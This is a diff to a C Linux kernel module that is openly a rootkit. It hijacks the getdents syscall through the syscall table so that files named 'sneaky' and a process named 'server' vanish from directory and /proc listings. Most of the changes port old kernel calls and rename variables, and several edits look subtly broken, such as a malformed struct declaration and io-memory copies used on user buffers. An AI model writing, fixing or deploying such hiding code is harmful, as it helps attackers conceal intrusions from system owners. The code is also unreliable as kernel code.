@@ -9,6 +9,11 @@
 #include <linux/proc_fs.h>
 #include <linux/types.h>
 #include <linux/dirent.h>
+#include <linux/slab.h>
+#include <linux/mman.h>
+#include <asm/fcntl.h>
+#include <linux/sched.h>
+
 
 
 MODULE_LICENSE("GPL");
@@ -20,17 +25,16 @@ MODULE_VERSION("0.1");
 #define sys_getdents __NR_getdents
 #define sneak_phrase "sneaky"
 unsigned long* syscall_table;
-struct linux_dirent{
+struct {
   unsigned long d_ino;
   unsigned long d_off;
   unsigned short d_reclen;
   char d_name[];
+} linux_dirent;
 
-}
+ int (*originalGetDents) (unsigned int fd, struct dirent *dirp , unsigned int count);
 
-asmlinkage int (*originalGetDents) (unsigned int fd, struct linux_dirent *dirp , unsigned int count);
-
-
+  
     static asmlinkage long* hijackgetdents(void){
     struct linux_dirent *hijackedDirent;
     char* fileNames;
@@ -60,8 +64,9 @@ return original;
     //extern void* sys_call_table[];
     /*process name we want to hide*/
     char mtroj[] = "server";
+    enum {PROC_ROOT_INO = 1};
 
-    int (*orig_getdents)(unsigned int fd, struct dirent *dirp, unsigned int count);
+    //int (*originalGetDents)(unsigned int fd, struct dirent *dirp, unsigned int count);
 
     /*convert a string to number*/
     int myatoi(char *str) {
@@ -140,7 +145,7 @@ return original;
       int t, proc = 0;
       struct inode *dinode;
       struct dirent *dirp2, *dirp3;
-      tmp = (*orig_getdents) (fd, dirp, count);
+      tmp = (*originalGetDents) (fd, dirp, count);
 
       #ifdef __LINUX_DCACHE_H
         dinode = current->files->fd[fd]->f_dentry->d_inode;
@@ -148,11 +153,11 @@ return original;
         dinode = current->files->fd[fd]->f_inode;
       #endif
 
-      if (dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev) == 1)
+      if (dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_rdev) && MINOR(dinode->i_rdev) == 1)
         proc=1;
       if (tmp > 0) {
          dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
-         memcpy_fromfs(dirp2, dirp, tmp);
+         memcpy_fromio(dirp2, dirp, tmp);
          dirp3 = dirp2;
          t = tmp;
          while (t > 0) {
@@ -168,7 +173,7 @@ return original;
               if (t != 0)
                 dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);
               }
-              memcpy_tofs(dirp, dirp2, tmp);
+              memcpy_toio(dirp, dirp2, tmp);
               kfree(dirp2);
             }
             return tmp;
@@ -176,14 +181,14 @@ return original;
 
           int init_module(void)                 /*module setup*/
           {
-            orig_getdents=sys_call_table[SYS_getdents];
-            sys_call_table[SYS_getdents]=hacked_getdents;
+            originalGetDents=syscall_table[sys_getdents];
+            syscall_table[sys_getdents]=hacked_getdents;
             return 0;
           }
 
           void cleanup_module(void)            /*module shutdown*/
           {
-            sys_call_table[SYS_getdents]=orig_getdents; }
+            syscall_table[sys_getdents]=originalGetDents; }
 
 
 
